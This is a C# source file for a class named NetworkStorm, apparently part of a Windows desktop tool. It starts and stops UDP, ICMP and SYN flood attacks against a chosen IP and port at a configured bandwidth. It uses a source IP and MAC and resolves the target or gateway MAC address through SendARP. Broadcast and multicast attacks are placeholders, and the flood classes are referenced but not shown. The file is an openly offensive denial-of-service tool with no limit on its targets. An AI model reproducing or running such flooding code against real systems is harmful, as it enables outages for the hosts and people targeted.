using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Controls;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Runtime.InteropServices;

namespace Dorothy.Models
{
    public class NetworkStorm
    {
        private readonly AttackLogger _logger;
        private readonly TextBox _logArea;
        private bool _isAttackRunning;
        private CancellationTokenSource? _cancellationSource;
        public string SourceIp { get; private set; }
        public byte[] SourceMac { get; private set; }
        public bool EnableLogging { get; set; }

        public NetworkStorm(TextBox logArea)
        {
            _logArea = logArea ?? throw new ArgumentNullException(nameof(logArea));
            _logger = new AttackLogger(logArea);
            SourceIp = string.Empty;
            SourceMac = Array.Empty<byte>();
        }

        public void SetSourceInfo(string sourceIp, byte[] sourceMac)
        {
            SourceIp = sourceIp;
            SourceMac = sourceMac;
        }

        private void Log(string message)
        {
            _logger.LogInfo(message);
        }

        public async Task StartAttackAsync(AttackType attackType, string targetIp, int targetPort, long megabitsPerSecond)
        {
            if (_isAttackRunning)
            {
                _logger.LogWarning("Attack already in progress.");
                return;
            }

            if (string.IsNullOrWhiteSpace(SourceIp) || SourceMac.Length != 6)
            {
                _logger.LogError("Source IP or MAC is not set. Cannot start attack.");
                throw new Exception("Source IP or MAC is not set.");
            }

            _cancellationSource = new CancellationTokenSource();
            _isAttackRunning = true;

            byte[] targetMac = await GetMacAddressAsync(targetIp);
            _logger.StartAttack(attackType, SourceIp, SourceMac, targetIp, targetMac, megabitsPerSecond);
            try
            {
                switch (attackType)
                {
                    case AttackType.UdpFlood:
                        using (var udpFlood = new UdpFlood(
                            SourceIp,
                            SourceMac,
                            targetIp,
                            targetMac,
                            targetPort,
                            megabitsPerSecond * 125_000,
                            _cancellationSource.Token))
                        {
                            await udpFlood.StartAsync();
                        }
                        break;
                    case AttackType.IcmpFlood:
                        using (var icmpFlood = new IcmpFlood(
                            SourceIp,
                            SourceMac,
                            targetIp,
                            targetMac,
                            megabitsPerSecond * 125_000,
                            _cancellationSource.Token))
                        {
                            await icmpFlood.StartAsync();
                        }
                        break;
                    case AttackType.SynFlood:
                        using (var tcpFlood = new TcpFlood(
                            SourceIp,
                            SourceMac,
                            targetIp,
                            targetMac,
                            targetPort,
                            megabitsPerSecond * 125_000,
                            _cancellationSource.Token))
                        {
                            await tcpFlood.StartAsync();
                        }
                        break;
                    default:
                        Log("Unknown Attack Type.");
                        break;
                }

                Log("Attack finished successfully.");
            }
            catch (Exception ex)
            {
                _logger.LogError($"Attack failed: {ex.Message}");
            }
            finally
            {
                _isAttackRunning = false;
                _cancellationSource?.Dispose();
            }
        }

        public async Task StopAttackAsync()
        {
            if (!_isAttackRunning)
            {
                _logger.LogWarning("No attack is currently running.");
                return;
            }

            try
            {
                _logger.LogInfo("Stopping attack...");
                _cancellationSource?.Cancel();
                _isAttackRunning = false;
                await Task.CompletedTask;
                _logger.LogInfo("Attack stop signal sent.");
            }
            finally
            {
                _cancellationSource?.Dispose();
                _cancellationSource = null;
            }
        }

        public async Task<byte[]> GetMacAddressAsync(string ipAddress)
        {
            return await Task.Run(() =>
            {
                try
                {
                    IPAddress targetIP = IPAddress.Parse(ipAddress);
                    IPAddress sourceIP = IPAddress.Parse(SourceIp);
                    
                    // Check if target is on different subnet
                    if (!IsOnSameSubnet(sourceIP, targetIP))
                    {
                        // Get default gateway address and MAC
                        var gateway = GetDefaultGateway();
                        if (gateway == null)
                        {
                            throw new Exception("Could not determine default gateway");
                        }
                        
                        var gatewayIp = BitConverter.ToInt32(gateway.GetAddressBytes(), 0);
                        var gatewayMacAddr = new byte[6];
                        var gatewayMacAddrLen = (uint)gatewayMacAddr.Length;
                        
                        var gatewayResult = SendARP(gatewayIp, 0, gatewayMacAddr, ref gatewayMacAddrLen);
                        if (gatewayResult != 0)
                        {
                            throw new Exception($"Failed to get gateway MAC address. Error code: {gatewayResult}");
                        }
                        
                        return gatewayMacAddr;
                    }
                    
                    // Same subnet - get target MAC directly
                    var destIp = BitConverter.ToInt32(targetIP.GetAddressBytes(), 0);
                    var srcIp = BitConverter.ToInt32(sourceIP.GetAddressBytes(), 0);
                    var targetMacAddr = new byte[6];
                    var targetMacAddrLen = (uint)targetMacAddr.Length;
                    
                    var targetResult = SendARP(destIp, srcIp, targetMacAddr, ref targetMacAddrLen);
                    if (targetResult != 0)
                    {
                        throw new Exception($"Failed to get MAC address. Error code: {targetResult}");
                    }
                    
                    return targetMacAddr;
                }
                catch (Exception ex)
                {
                    _logger.LogError($"Failed to get MAC address: {ex.Message}");
                    throw;
                }
            });
        }

        private bool IsOnSameSubnet(IPAddress ip1, IPAddress ip2)
        {
            byte[] subnet = new byte[] { 255, 255, 255, 0 }; // Default subnet mask
            byte[] bytes1 = ip1.GetAddressBytes();
            byte[] bytes2 = ip2.GetAddressBytes();
            
            for (int i = 0; i < 4; i++)
            {
                if ((bytes1[i] & subnet[i]) != (bytes2[i] & subnet[i]))
                    return false;
            }
            return true;
        }

        private IPAddress? GetDefaultGateway()
        {
            return NetworkInterface.GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up)
                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                .Select(g => g?.Address)
                .FirstOrDefault(a => a != null && a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref uint macAddrLen);

        public async Task StartBroadcastAttackAsync(string targetIp, int targetPort, long megabitsPerSecond)
        {
            // Placeholder for broadcast attack implementation
            _logger.LogInfo($"Starting broadcast attack (placeholder) - Target: {targetIp}:{targetPort}, Rate: {megabitsPerSecond}Mbps");
            await Task.CompletedTask;
        }

        public async Task StartMulticastAttackAsync(string targetIp, int targetPort, long megabitsPerSecond)
        {
            // Placeholder for multicast attack implementation
            _logger.LogInfo($"Starting multicast attack (placeholder) - Target: {targetIp}:{targetPort}, Rate: {megabitsPerSecond}Mbps");
            await Task.CompletedTask;
        }
    }
}